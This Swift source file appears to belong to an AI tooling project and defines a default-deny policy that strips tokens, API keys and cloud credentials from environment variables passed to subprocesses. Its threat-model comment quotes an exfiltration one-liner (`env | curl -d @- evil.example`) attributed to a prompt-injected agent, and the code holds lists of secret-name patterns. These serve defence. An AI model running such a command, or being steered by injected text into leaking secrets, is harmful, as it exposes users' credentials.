import Foundation

/// Policy for the environment variables that Senkani passes down to
/// subprocesses spawned by `senkani_exec` and similar tools.
///
/// Why this exists
/// ---------------
/// A `Process` created without setting `environment` inherits the parent's
/// env verbatim. Senkani's MCP server runs inside a user shell that very
/// plausibly has `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
/// `AWS_SECRET_ACCESS_KEY`, etc. in scope. Running an arbitrary user command
/// like `npm install` with that environment hands the command full read
/// access to those secrets — and any postinstall script or prompt-injected
/// command can exfiltrate them.
///
/// Threat model
/// ------------
/// - A hostile `npm install` / `pip install --user` postinstall script can
///   read `process.env.GITHUB_TOKEN` and POST it anywhere.
/// - A prompt-injected agent can run `env | curl -d @- evil.example` and
///   leak the entire environment.
/// - A legitimate command that writes logs can accidentally persist a
///   secret if it calls `os.environ` into a log line.
///
/// Design
/// ------
/// Default-deny. A variable is stripped from the child environment unless
/// it passes one of:
///   1. An exact-name passthrough list (safe execution plumbing: `PATH`,
///      `HOME`, `SHELL`, etc.).
///   2. A prefix passthrough list (locale: `LC_*`, terminal: `TERM*`,
///      Senkani's own pane plumbing: `SENKANI_*`).
///   3. An explicit allowlist from the caller (rare; currently none).
///
/// Any name (case-insensitive) that matches a sensitive substring —
/// `TOKEN`, `SECRET`, `PASSWORD`, `KEY`, `CREDENTIAL`, `AUTH`, or a cloud
/// prefix like `AWS_`, `GCP_`, `AZURE_`, `DO_` — is stripped even if it
/// would otherwise match a prefix rule.
///
/// The resulting env is still useful: commands can run, locales render,
/// terminals paint color, Senkani's per-pane plumbing reaches children.
/// Secrets don't.
public enum SensitiveEnvironmentPolicy {

    /// Exact variable names that are always safe to pass through.
    /// Order doesn't matter — lookup uses a Set.
    public static let safeExactNames: Set<String> = [
        "PATH",
        "HOME",
        "SHELL",
        "USER",
        "LOGNAME",
        "TMPDIR",
        "LANG",
        "LANGUAGE",
        "TERM",
        "TERMINFO",
        "COLORTERM",
        "PWD",
        "OLDPWD",
        "EDITOR",
        "PAGER",
        "MANPATH",
        "INFOPATH",
        // Safe toolchain locators. They point at install roots, not secrets.
        "XDG_CONFIG_HOME",
        "XDG_DATA_HOME",
        "XDG_CACHE_HOME",
        "XDG_STATE_HOME",
        // CI-agnostic knobs that tools read for behavior, not auth.
        "CI",
        "FORCE_COLOR",
        "NO_COLOR",
        "CLICOLOR",
        "NODE_ENV",
    ]

    /// Variable name prefixes that are always safe to pass through.
    /// Used for families like locale (`LC_*`), terminal (`TERM*`), and
    /// Senkani's own per-pane plumbing (`SENKANI_*`).
    public static let safePrefixes: [String] = [
        "LC_",
        "SENKANI_",
    ]

    /// Substrings (case-insensitive) that mark a variable as sensitive.
    /// Matching here overrides any prefix / exact-name allowlist so a
    /// variable named `SENKANI_TOKEN` is still stripped.
    public static let sensitiveSubstrings: [String] = [
        "TOKEN",
        "SECRET",
        "PASSWORD",
        "PASSWD",
        "PASSPHRASE",
        "CREDENTIAL",
        "PRIVATE_KEY",
        "PRIV_KEY",
        "AUTH",
        "APIKEY",
        "API_KEY",
        "SESSION_KEY",
        "ACCESS_KEY",
        "CSRF",
    ]

    /// Variable name prefixes that are always sensitive — cloud vendor
    /// scopes that almost always hold credentials.
    public static let sensitivePrefixes: [String] = [
        "AWS_",
        "GCP_",
        "GOOGLE_",
        "AZURE_",
        "DO_",          // DigitalOcean
        "DIGITALOCEAN_",
        "CLOUDFLARE_",
        "HEROKU_",
        "NPM_TOKEN",
        "PYPI_",
        "DOCKER_",
        "GH_",          // gh CLI tokens
        "GITHUB_",      // GITHUB_TOKEN, GITHUB_API_TOKEN, etc.
        "GITLAB_",
        "BITBUCKET_",
        "SENTRY_",
        "DATADOG_",
        "DD_",          // Datadog shorthand
        "SLACK_",
        "STRIPE_",
        "TWILIO_",
        "SENDGRID_",
        "MAILGUN_",
        "POSTGRES_",
        "PG_",
        "MYSQL_",
        "REDIS_",
        "MONGODB_",
        "SUPABASE_",
        "FIREBASE_",
        "VERCEL_",
        "NETLIFY_",
        "OPENAI_",
        "ANTHROPIC_",
        "HUGGINGFACE_",
        "HF_",
        "COHERE_",
        "REPLICATE_",
        "MISTRAL_",
    ]

    /// Return a sanitized copy of `input`, keeping only variables that are
    /// safe by policy. Deterministic and allocation-light (one new dict).
    public static func sanitize(_ input: [String: String]) -> [String: String] {
        var out: [String: String] = [:]
        out.reserveCapacity(min(input.count, 32))
        for (k, v) in input {
            if isSafe(name: k) {
                out[k] = v
            }
        }
        return out
    }

    /// True when `name` is allowed through to a child process.
    public static func isSafe(name: String) -> Bool {
        if isSensitive(name: name) { return false }
        if safeExactNames.contains(name) { return true }
        for prefix in safePrefixes where name.hasPrefix(prefix) {
            return true
        }
        return false
    }

    /// True when `name` matches a sensitive substring or cloud prefix.
    /// Case-insensitive on the substring match because env var casing is
    /// convention, not contract.
    public static func isSensitive(name: String) -> Bool {
        let upper = name.uppercased()
        for sub in sensitiveSubstrings where upper.contains(sub) {
            return true
        }
        for prefix in sensitivePrefixes where upper.hasPrefix(prefix) {
            return true
        }
        return false
    }
}
